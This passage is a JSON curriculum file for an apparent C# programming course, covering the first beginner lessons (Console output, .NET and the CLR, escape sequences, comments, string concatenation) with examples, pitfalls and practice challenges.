{
  "id": "csharp",
  "language": "csharp",
  "title": "C# Programming",
  "description": "Master C# and .NET development from fundamentals to advanced concepts, including object-oriented programming, LINQ, async/await, and modern C# features.",
  "difficulty": "advanced",
  "estimatedHours": 29,
  "prerequisites": [],
  "modules": [
    {
      "id": "module-01",
      "title": "Getting Started with C#",
      "description": "Introduction to programming, C#, and .NET. Learn basic syntax, output, comments, and your first programs.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-01-01",
          "title": "What is Programming?",
          "moduleId": "module-01",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're teaching a robot to make a sandwich. You can't just say \"make me lunch\" – the robot needs EXACT steps: pick up bread, put on peanut butter, put on jelly, combine slices. That's programming! You're giving a computer step-by-step instructions in a language it understands.\n\nC# (pronounced \"See-Sharp\") is one of those languages. It's like English, but much more precise and rule-based. When you write C# code, you're telling the computer exactly what to do, one instruction at a time."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example shows your first C# program using Console.WriteLine to display text to the screen.",
              "code": "// YOUR FIRST C# PROGRAM!\n// This is a comment - the computer ignores it\n// Comments help humans understand the code\n\nConsole.WriteLine(\"Hello, World!\");\n\n// Let's break this down:\n// Console = The black window where text appears\n// WriteLine = Write a line of text\n// \"Hello, World!\" = The text to display\n// ; = End of instruction (like a period in English)\n\n// More examples:\nConsole.WriteLine(\"Welcome to C#!\");\nConsole.WriteLine(\"Programming is fun!\");\nConsole.WriteLine(\"I am learning C#!\");\n\n// Each instruction runs in order:\nConsole.WriteLine(\"First\");   // Runs 1st\nConsole.WriteLine(\"Second\");  // Runs 2nd\nConsole.WriteLine(\"Third\");   // Runs 3rd\n\n// Output:\n// First\n// Second\n// Third",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`//`**: Two slashes create a 'comment' – notes for humans that the computer ignores. Use these to explain your code!\n\n**`Console.WriteLine`**: This is like saying \"Computer, speak!\" It tells the computer to display text on the screen.\n\n**`(\"Hello, World!\")`**: The text inside quotes is the MESSAGE you want to display. It must be in quotes so C# knows it's text, not code.\n\n**`;`**: The semicolon is like a period at the end of a sentence. It tells C#: \"This instruction is complete!\"\n\n## Top-Level Statements in .NET 9\n\nIn modern C# (.NET 6+), you can write code directly without wrapping it in a class and Main method. This feature, called 'top-level statements', lets beginners start coding immediately:\n\n```csharp\n// No class needed! Just write code.\nConsole.WriteLine(\"Hello!\");\n```\n\nBehind the scenes, C# creates the class structure for you. This is why our examples work without all the boilerplate code!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Forgetting the semicolon**: Every statement MUST end with `;`\n```csharp\nConsole.WriteLine(\"Hi\")  // ERROR: Missing semicolon!\nConsole.WriteLine(\"Hi\"); // Correct\n```\n\n**Case sensitivity matters**: C# distinguishes uppercase from lowercase!\n```csharp\nconsole.writeline(\"Hi\"); // ERROR: Wrong case!\nConsole.WriteLine(\"Hi\"); // Correct\n```\n\n**Missing or mismatched quotes**: Text must be wrapped in matching double quotes.\n```csharp\nConsole.WriteLine(Hello);   // ERROR: No quotes!\nConsole.WriteLine(\"Hello);  // ERROR: Missing closing quote!\nConsole.WriteLine(\"Hello\"); // Correct\n```\n\n**Spelling errors**: `WriteLine` not `Writeline` or `WritLine` - there's no autocorrect!"
            },
            {
              "type": "REAL_WORLD",
              "title": "Where C# is Used in Production",
              "content": "## Real-World C# Applications\n\nC# powers some of the world's most demanding systems, and learning it opens doors to diverse career opportunities.\n\n**E-Commerce & Web Applications**\nMajor online retailers and platforms use ASP.NET Core for their backend APIs, handling millions of transactions daily. Stack Overflow, the world's largest programming Q&A site, runs entirely on .NET. Companies like GoDaddy, UPS, and Chipotle rely on C# for their web infrastructure. The performance optimizations in .NET 9 make it ideal for high-throughput e-commerce systems where every millisecond matters.\n\n**Game Development**\nUnity, the world's most popular game engine powering over 50% of all mobile games, uses C# as its primary scripting language. From indie hits like Hollow Knight and Cuphead to AAA titles, C# provides the perfect balance of performance and developer productivity. The language's strong typing catches bugs at compile time, crucial when building complex game logic.\n\n**Enterprise & Financial Systems**\nBanks, healthcare systems, insurance companies, and government agencies rely on C# for mission-critical applications. The language's emphasis on type safety, combined with .NET's robust security features, makes it the go-to choice for applications where reliability and compliance are non-negotiable. Morgan Stanley, Goldman Sachs, and numerous healthcare providers run core systems on .NET.\n\n**Cloud & Microservices**\nMicrosoft Azure's own services are built with .NET, and Azure provides first-class support for deploying C# applications. The modern .NET stack excels at containerized microservices, with minimal memory footprint and fast startup times. Companies increasingly choose C# for cloud-native development because of its performance characteristics and mature tooling ecosystem.\n\n**In this course**, you'll build ShopFlow—a complete e-commerce platform—using the same technologies and patterns used by professional developers at these companies worldwide. By the end, you'll have a portfolio-ready project demonstrating full-stack .NET expertise."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-01-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Write your first program!\n\n1. Display \"Hello, World!\" (the traditional first program)\n2. Display your name\n3. Display your favorite hobby\n4. Display a message about what you want to learn\n\nUse Console.WriteLine() for each line.\nDon't forget the semicolons!\nAdd comments explaining what each line does.",
              "starterCode": "// My First C# Program\n// This program displays information about me\n\nConsole.WriteLine(\"Hello, World!\");\n\n// TODO: Display your name here\n\n// TODO: Display your hobby\n\n// TODO: Display what you want to learn",
              "solution": "// My First C# Program\n// This program displays information about me\n\nConsole.WriteLine(\"Hello, World!\");\n\n// Display my name\nConsole.WriteLine(\"My name is Alex\");\n\n// Display my hobby\nConsole.WriteLine(\"I love playing guitar\");\n\n// Display my learning goal\nConsole.WriteLine(\"I want to learn C# to build games!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Hello\"",
                  "expectedOutput": "Hello",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"World\"",
                  "expectedOutput": "World",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use Console.WriteLine() with text in quotes. End each line with semicolon. Add // comments to explain!"
                },
                {
                  "level": 2,
                  "text": "Forgetting semicolons: Every statement needs a semicolon at the end! Without it, you get an error. Console.WriteLine(\"Hi\"); ✓ Console.WriteLine(\"Hi\") ✗"
                },
                {
                  "level": 3,
                  "text": "Missing quotes: Text must be in quotes! Console.WriteLine(Hello) ✗ Console.WriteLine(\"Hello\") ✓"
                },
                {
                  "level": 4,
                  "text": "Case sensitivity: C# cares about CAPITAL vs lowercase! Console.WriteLine ✓ console.writeline ✗ Always match exactly!"
                },
                {
                  "level": 5,
                  "text": "Spelling: WriteLine not Writeline! Computer doesn't autocorrect spelling errors."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Every statement needs a semicolon at the end! Without it, you get an error. Console.WriteLine(\"Hi\"); ✓ Console.WriteLine(\"Hi\") ✗",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Missing quotes",
                  "consequence": "Text must be in quotes! Console.WriteLine(Hello) ✗ Console.WriteLine(\"Hello\") ✓",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Case sensitivity",
                  "consequence": "C# cares about CAPITAL vs lowercase! Console.WriteLine ✓ console.writeline ✗ Always match exactly!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Spelling",
                  "consequence": "WriteLine not Writeline! Computer doesn't autocorrect spelling errors.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-01-02",
          "title": "What is .NET and the CLR?",
          "moduleId": "module-01",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Think of C# as a recipe written in English, but your computer only speaks binary (0s and 1s). How does the computer understand your C# code?\n\nThat's where .NET comes in! .NET is like a translation service:\n\n1. You write C# code (human-readable)\n2. The .NET compiler translates it into an intermediate language\n3. The CLR (Common Language Runtime) – the \"engine\" – runs that code on your computer\n\nThe CLR is like the engine in a car. You don't see it working, but without it, your code won't run. It handles memory, security, and making sure your program doesn't crash the whole computer!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the CLR working behind the scenes. When you run this code, .NET compiles it to intermediate language (IL), then the CLR's JIT compiler converts it to machine code for your specific computer.",
              "code": "// The CLR is the engine powering your C# programs!\n\n// Step 1: You write C# code (what you're doing now)\nConsole.WriteLine(\"Hello from C#!\");\n\n// Step 2: The compiler turns this into IL (Intermediate Language)\n// Step 3: The CLR's JIT (Just-In-Time) compiler converts IL to machine code\n// Step 4: Your computer runs the machine code!\n\n// The CLR also provides:\nConsole.WriteLine(\"- Automatic memory management (no manual cleanup!)\");\nConsole.WriteLine(\"- Type safety (catches errors before they crash)\");\nConsole.WriteLine(\"- Security features (protects against malicious code)\");\nConsole.WriteLine(\"- Exception handling (graceful error recovery)\");\n\n// You're using .NET 9 - released November 2024!\n// It includes the latest CLR with improved performance\n// and Native AOT for faster startup times.",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Understanding the .NET Ecosystem\n\n**`.NET`**: The complete platform for building applications. It includes:\n- The CLR (runtime engine)\n- Base Class Library (pre-built code like Console.WriteLine)\n- Compilers (C#, F#, VB.NET)\n- Tools (dotnet CLI, Visual Studio integration)\n\n**`CLR (Common Language Runtime)`**: The 'engine' that runs your code. It provides:\n- **JIT Compilation**: Converts your code to machine language\n- **Garbage Collection**: Automatically cleans up unused memory\n- **Type Safety**: Ensures you use data correctly\n- **Security**: Sandboxes code to prevent harm\n\n**`.NET 9 (Current Version)`**: Released November 2024, it includes:\n- Improved runtime performance\n- Native AOT (Ahead-of-Time) compilation for faster startups\n- Better ARM64 support\n- Enhanced cloud-native features\n\n**`Why This Matters`**: You write simple C# code, and the CLR handles all the complex stuff - memory, security, cross-platform compatibility. It's like having a really smart assistant!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Important Things to Remember\n\n**Don't confuse .NET Framework with .NET**: .NET Framework (older, Windows-only) is different from modern .NET (cross-platform). We use .NET 9!\n\n**.NET versions matter**: Code written for .NET 9 might use features unavailable in older versions. Always check your target framework.\n\n**The CLR is invisible but essential**: If you see errors like 'CLR exception' or 'runtime error', it means something went wrong while your code was running - not during compilation.\n\n**Cross-platform doesn't mean identical**: While .NET 9 runs on Windows, Mac, and Linux, some features (like Windows Forms) are platform-specific."
            },
            {
              "type": "DEEP_DIVE",
              "title": "Inside the CLR: How Your Code Actually Runs",
              "content": "## The Compilation Pipeline\n\nWhen you run `dotnet build`, your C# code goes through multiple transformations before it can run on your computer. Understanding this pipeline helps you debug issues and make informed performance decisions.\n\n**1. Roslyn Compiler (C# → IL)**\nThe Roslyn compiler parses your C# source code and converts it to Intermediate Language (IL), also called MSIL or CIL. IL is a platform-independent bytecode—think of it as a universal language that any .NET runtime can understand. This compiled IL is stored in .dll or .exe files. The beauty of IL is that you write code once, and it can run on Windows, Linux, or macOS without recompilation.\n\n**2. Just-In-Time Compilation (IL → Machine Code)**\nWhen your application starts, the CLR's JIT (Just-In-Time) compiler converts IL to native machine code specific to your CPU architecture (x64, ARM64, etc.). The JIT compiler is smart—it only compiles methods when they're first called, not the entire application upfront.\n\n.NET 9 includes Dynamic PGO (Profile-Guided Optimization), which observes how your code actually runs and recompiles hot paths with better optimizations. This means your application gets faster the longer it runs, as the JIT learns from real usage patterns.\n\n**3. Native AOT (Ahead-of-Time Compilation)**\n.NET 9 also supports Native AOT, which compiles directly to native machine code at build time, completely bypassing the JIT. This eliminates startup latency (great for serverless functions or CLI tools) but produces larger binaries and loses some runtime flexibility. Choose JIT for long-running services; choose AOT for quick-start scenarios.\n\n**4. Garbage Collection**\nThe CLR automatically manages memory through garbage collection (GC). When objects are no longer referenced, the GC reclaims that memory. .NET's GC is highly tuned—it uses generational collection (Gen0, Gen1, Gen2) because most objects die young. You rarely need to think about memory management, but understanding GC helps when optimizing performance-critical code.\n\n**Why This Matters**\nUnderstanding the compilation pipeline helps you:\n- Debug assembly-related errors and version conflicts\n- Choose between JIT (flexibility) and AOT (startup speed) for deployment\n- Understand performance profiling results\n- Make informed decisions about memory usage\n\n**Viewing IL Code**\nCurious what your C# becomes? Install the IL decompiler:\n`dotnet tool install -g ilspycmd`\n\nThen inspect any assembly:\n`ilspycmd YourApp.dll`\n\nYou'll see the intermediate representation that the CLR actually executes—a valuable learning experience!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-01-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Write a program that displays THREE lines of text:\n1. Your name\n2. Your favorite programming language (hint: it should be C#!)\n3. One thing you want to build with code",
              "starterCode": "// Display your name\nConsole.WriteLine(\"Your name here\");\n\n// Display your favorite language\n\n// Display what you want to build",
              "solution": "// Display your name\nConsole.WriteLine(\"Alex\");\n\n// Display your favorite language\nConsole.WriteLine(\"My favorite language is C#\");\n\n// Display what you want to build\nConsole.WriteLine(\"I want to build a video game!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain at least 3 lines",
                  "expectedOutput": "Console.WriteLine",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Program should display text output",
                  "expectedOutput": "WriteLine",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Code should use proper C# syntax",
                  "expectedOutput": ";",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "You'll need THREE Console.WriteLine statements – one for each line! Copy the pattern from the first line."
                },
                {
                  "level": 2,
                  "text": "Forgetting to add Console.WriteLine for each line – you need three separate statements!"
                },
                {
                  "level": 3,
                  "text": "Forgetting the semicolon at the end of EACH line"
                },
                {
                  "level": 4,
                  "text": "Not putting quotes around the text – every piece of text needs quotes!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to add Console.WriteLine for each line – you need three separate statements!",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Forgetting the semicolon at the end of EACH line",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Not putting quotes around the text – every piece of text needs quotes!",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-01-03",
          "title": "Displaying Multiple Lines",
          "moduleId": "module-01",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned that Console.WriteLine displays text. But what if you want to display LOTS of information? You have two options:\n\n1. Use multiple Console.WriteLine statements (you've been doing this!)\n2. Use special characters like \\n (newline) to create line breaks inside one statement\n\nThink of \\n as pressing the 'Enter' key on your keyboard. It tells the computer: \"Start a new line here!\""
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Method 1: Multiple WriteLine statements\nConsole.WriteLine(\"First line\");\nConsole.WriteLine(\"Second line\");\n\n// Method 2: Using \\n for newlines\nConsole.WriteLine(\"First line\\nSecond line\\nThird line\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`\\n`**: The backslash-n creates a newline (line break). It's called an 'escape sequence' – special characters that do something instead of displaying.\n\n**`Multiple WriteLine vs. \\n`**: Both methods work! Multiple WriteLine is clearer for beginners. Using \\n is more compact but harder to read at first.\n\n## Common Escape Sequences\n\n| Sequence | Meaning |\n|----------|--------|\n| `\\n` | Newline (line break) |\n| `\\t` | Tab (horizontal indent) |\n| `\\r` | Carriage return |\n| `\\\\` | Literal backslash |\n| `\\\"` | Literal double quote |\n| `\\'` | Literal single quote |\n| `\\0` | Null character |\n| `\\e` | Escape character (C# 13+) |\n\n**C# 13 Feature**: The `\\e` escape sequence is new in C# 13! It represents the escape character (Unicode 0x1B), commonly used for ANSI terminal colors:\n\n```csharp\n// C# 13: \\e escape sequence for terminal colors\nConsole.WriteLine(\"\\e[32mGreen text\\e[0m\");\nConsole.WriteLine(\"\\e[1;31mBold red\\e[0m\");\n```\n\nNote: ANSI colors may not work in all terminals.\n\n## Write vs. WriteLine\n\n**`Console.Write()`**: Outputs text WITHOUT moving to a new line.\n**`Console.WriteLine()`**: Outputs text AND moves to a new line.\n\n```csharp\nConsole.Write(\"Hello \");\nConsole.Write(\"World\");  // Output: Hello World (same line)\n\nConsole.WriteLine(\"Hello\");\nConsole.WriteLine(\"World\"); // Output on separate lines\n```"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Forward slash vs. backslash**: Escape sequences use BACKSLASH `\\`, not forward slash `/`!\n```csharp\nConsole.WriteLine(\"Line1/nLine2\");  // Wrong: prints literally /n\nConsole.WriteLine(\"Line1\\nLine2\"); // Correct: creates new line\n```\n\n**The \\x escape sequence trap**: Before C# 13's `\\e`, you might see `\\x1b` for the escape character. But `\\x` is dangerous:\n```csharp\nstring bad = \"\\x1b2F\";  // BUG: Reads as single char U+1B2F!\nstring good = \"\\e2F\";   // C# 13: Correct - ESC + '2' + 'F'\n```\n\n**Escape sequences only work in strings**: They must be inside quotes!\n```csharp\n\\n  // ERROR: Not in a string!\n\"\\n\" // Correct: Inside quotes\n```\n\n**Raw string literals ignore escapes**: If you use raw strings (triple quotes), escape sequences are literal:\n```csharp\nConsole.WriteLine(\"\"\"Line1\\nLine2\"\"\"); // Prints: Line1\\nLine2 (literally!)\n```"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-01-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a mini-biography using Console.WriteLine! Display:\n• A title line: 'About Me'\n• Your name\n• Your age\n• Your favorite hobby\n\nTry using \\n to create blank lines between sections for better readability!",
              "starterCode": "// Your mini-biography\nConsole.WriteLine(\"About Me\");\n// Add more lines here!",
              "solution": "// Your mini-biography\nConsole.WriteLine(\"About Me\\n\");\nConsole.WriteLine(\"Name: Alex\");\nConsole.WriteLine(\"Age: 25\");\nConsole.WriteLine(\"Favorite Hobby: Coding!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"About Me\"",
                  "expectedOutput": "About Me",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Remember: \\n creates a blank line. Try Console.WriteLine(\"About Me\\n\"); to add space after the title!"
                },
                {
                  "level": 2,
                  "text": "Writing /n instead of \\n – it must be a BACKSLASH (\\), not a forward slash (/)!"
                },
                {
                  "level": 3,
                  "text": "Forgetting quotes around text with \\n – the entire string needs quotes: \"Line1\\nLine2\""
                },
                {
                  "level": 4,
                  "text": "Not seeing the newline work – make sure you're using Console.WriteLine, not Console.Write"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Writing /n instead of \\n – it must be a BACKSLASH (\\), not a forward slash (/)!",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Forgetting quotes around text with \\n – the entire string needs quotes",
                  "consequence": "\"Line1\\nLine2\"",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not seeing the newline work – make sure you're using Console.WriteLine, not Console.Write",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-01-04",
          "title": "Comments: Notes for Humans",
          "moduleId": "module-01",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're leaving notes in a cookbook: \"This recipe is spicy!\" or \"Mom's favorite!\". These notes help YOU, but they don't change the recipe itself.\n\nComments in C# work the same way! They're notes for humans (including your future self) that the computer completely ignores. There are two types:\n\n1. Single-line comments: // Everything after these slashes is ignored\n2. Multi-line comments: /* Everything between these is ignored */\n\nGood programmers use comments to explain WHY they wrote code, not just WHAT the code does. Future you will thank present you!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates all three types of comments in C#: single-line, multi-line, and XML documentation comments.",
              "code": "// This is a single-line comment\nConsole.WriteLine(\"This runs!\"); // Comments can go at the end of a line too!\n\n/* This is a multi-line comment.\n   You can write as much as you want.\n   The computer will ignore ALL of this! */\n\nConsole.WriteLine(\"This also runs!\");\n\n// You can also \"comment out\" code to disable it:\n// Console.WriteLine(\"This won't run!\");\n\n// Tip: In Visual Studio / VS Code:\n// Select lines and press Ctrl+K, Ctrl+C to comment\n// Press Ctrl+K, Ctrl+U to uncomment",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`// Single-line comment`**: Everything after // on that line is ignored. Quick notes go here!\n\n**`/* Multi-line comment */`**: Everything between /* and */ is ignored, even across multiple lines. Good for long explanations.\n\n**`Why use comments?`**: Comments explain your thinking: \"This loop finds the highest score\" is better than just reading the code!\n\n## XML Documentation Comments (Preview)\n\nProfessional C# developers use special `///` comments for documentation:\n\n```csharp\n/// <summary>\n/// Displays a welcome message to the user.\n/// </summary>\nvoid ShowWelcome()\n{\n    Console.WriteLine(\"Welcome!\");\n}\n```\n\nThese generate automatic documentation and show tooltips in your IDE. You'll learn more about these when we cover methods!\n\n## Code Regions\n\nC# also has `#region` directives to organize code into collapsible sections:\n\n```csharp\n#region Initialization Code\nConsole.WriteLine(\"Starting...\");\nConsole.WriteLine(\"Loading...\");\n#endregion\n```\n\nRegions help organize large files but aren't true comments - they're preprocessor directives."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Forgetting to close multi-line comments**: If you start `/*` but forget `*/`, EVERYTHING after becomes a comment!\n```csharp\n/* This is a comment\nConsole.WriteLine(\"This is also a comment!\");\nConsole.WriteLine(\"So is this - oops!\");\n// ERROR: Entire rest of file is commented out!\n```\n\n**Comments that just repeat the code**: Bad comments waste time!\n```csharp\n// Bad: \"Add 1 to x\" - we can see that!\nx = x + 1;\n\n// Good: \"Increment retry counter after failed connection\"\nretryCount = retryCount + 1;\n```\n\n**Outdated comments are worse than no comments**: If you change code, UPDATE the comment!\n```csharp\n// Calculates the sum  <-- LIE! Code now calculates average\nint result = total / count;\n```\n\n**Nested multi-line comments don't work**:\n```csharp\n/* outer /* inner */ still in outer! */ // ERROR!\n```\n\n**Don't comment obvious code**: Trust the reader. Comment the WHY, not the WHAT."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-01-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Write a program that displays a simple ASCII art (like a smiley face), but ADD COMMENTS explaining each line!\n\nFor example:\n// Top of the face\nConsole.WriteLine(\"  ^   ^  \");\n// The mouth\nConsole.WriteLine(\"   ---   \");",
              "starterCode": "// Create your ASCII art here!\n// Remember to add comments explaining each part!\n\nConsole.WriteLine(\"Add your art here\");",
              "solution": "// Top of the face - the eyes\nConsole.WriteLine(\"  ^   ^  \");\n\n// The nose (simple dot)\nConsole.WriteLine(\"    .    \");\n\n// The mouth (happy smile)\nConsole.WriteLine(\"   ---   \");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Code should include comments",
                  "expectedOutput": "//",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should display ASCII art using Console.WriteLine",
                  "expectedOutput": "Console.WriteLine",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Code should have multiple output statements",
                  "expectedOutput": "WriteLine",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use Console.WriteLine for each line of your art, and add // comments above each line to explain it!"
                },
                {
                  "level": 2,
                  "text": "Forgetting that comments are for HUMANS, not the computer – they don't do anything to your code!"
                },
                {
                  "level": 3,
                  "text": "Using /* to start a comment but forgetting */ to close it – everything after becomes a comment!"
                },
                {
                  "level": 4,
                  "text": "Writing comments that just repeat the code: // Display text is not helpful. // Display welcome message to user is better!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting that comments are for HUMANS, not the computer – they don't do anything to your code!",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Using /* to start a comment but forgetting */ to close it – everything after becomes a comment!",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Writing comments that just repeat the code",
                  "consequence": "// Display text is not helpful. // Display welcome message to user is better!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-01-05",
          "title": "Combining Text (String Concatenation)",
          "moduleId": "module-01",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Sometimes you want to combine pieces of text, like combining 'Hello' and 'World' into 'Hello World'. This is called STRING CONCATENATION (fancy word for 'gluing text together').\n\nIn C#, you can combine text using the + operator:\n\n\"Hello\" + \" \" + \"World\" becomes \"Hello World\"\n\nYou can also mix text and numbers! C# automatically converts numbers to text when you use +.\n\nThink of + as glue – it sticks pieces of text together into one long piece!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example shows string concatenation with the + operator, and introduces the modern string interpolation approach preferred in .NET 9.",
              "code": "// METHOD 1: String Concatenation (using +)\nConsole.WriteLine(\"Hello\" + \" \" + \"World\");\nConsole.WriteLine(\"I have \" + 5 + \" apples\");\nConsole.WriteLine(\"The answer is: \" + (2 + 2));\n\n// METHOD 2: String Interpolation (MODERN - preferred!)\n// Put $ before the string, then use {variable} inside\nstring name = \"Alex\";\nint age = 25;\n\nConsole.WriteLine($\"Hello, {name}!\");           // Hello, Alex!\nConsole.WriteLine($\"You are {age} years old.\"); // You are 25 years old.\nConsole.WriteLine($\"Next year: {age + 1}\");     // Next year: 26\n\n// Interpolation is cleaner and easier to read!\n// Compare:\nConsole.WriteLine(\"Name: \" + name + \", Age: \" + age);  // Concatenation\nConsole.WriteLine($\"Name: {name}, Age: {age}\");        // Interpolation",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`\"Text1\" + \"Text2\"`**: The + operator glues text together. Make sure there's a space between words, or they'll stick together like 'HelloWorld'!\n\n**`\"Text\" + number`**: When you add text and a number, C# converts the number to text first. \"I am \" + 25 becomes \"I am 25\".\n\n**`(2 + 2) in text`**: Parentheses matter! \"Result: \" + 2 + 2 gives \"Result: 22\" (text gluing), but \"Result: \" + (2 + 2) gives \"Result: 4\" (math first).\n\n## String Interpolation: The Modern Way\n\nIn modern C# (.NET 6+), **string interpolation** is preferred over concatenation:\n\n```csharp\n// Old way (concatenation)\nstring message = \"Hello, \" + name + \"! You have \" + count + \" items.\";\n\n// Modern way (interpolation) - cleaner!\nstring message = $\"Hello, {name}! You have {count} items.\";\n```\n\n**Why interpolation is better:**\n- More readable - the text flows naturally\n- Less error-prone - no forgetting + or spaces\n- Supports formatting: `$\"{price:C}\"` for currency, `$\"{date:yyyy-MM-dd}\"` for dates\n- Better performance in .NET 6+ (compiler optimizes it!)\n\nWe teach concatenation first because it helps you understand HOW strings combine. But in real projects, use interpolation!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Forgetting spaces between concatenated words**:\n```csharp\nConsole.WriteLine(\"Hello\" + \"World\");   // HelloWorld (no space!)\nConsole.WriteLine(\"Hello \" + \"World\");  // Hello World (correct)\nConsole.WriteLine(\"Hello\" + \" World\"); // Hello World (also correct)\n```\n\n**The + operator order trap**: C# evaluates left to right!\n```csharp\nConsole.WriteLine(\"Sum: \" + 2 + 2);   // Sum: 22 (text + 2 = text, then + 2 = text)\nConsole.WriteLine(\"Sum: \" + (2 + 2)); // Sum: 4 (math first in parentheses)\nConsole.WriteLine(2 + 2 + \" is the sum\"); // 4 is the sum (math happens first!)\n```\n\n**Forgetting the $ for interpolation**:\n```csharp\nConsole.WriteLine(\"Hello {name}\");  // Prints literally: Hello {name}\nConsole.WriteLine($\"Hello {name}\"); // Prints: Hello Alex\n```\n\n**Escaping braces in interpolation**: To print literal braces, double them:\n```csharp\nConsole.WriteLine($\"Use {{name}} syntax\"); // Use {name} syntax\n```\n\n**Performance note**: In loops with many iterations, consider `StringBuilder` instead of repeated concatenation (covered in advanced lessons)."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-01-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
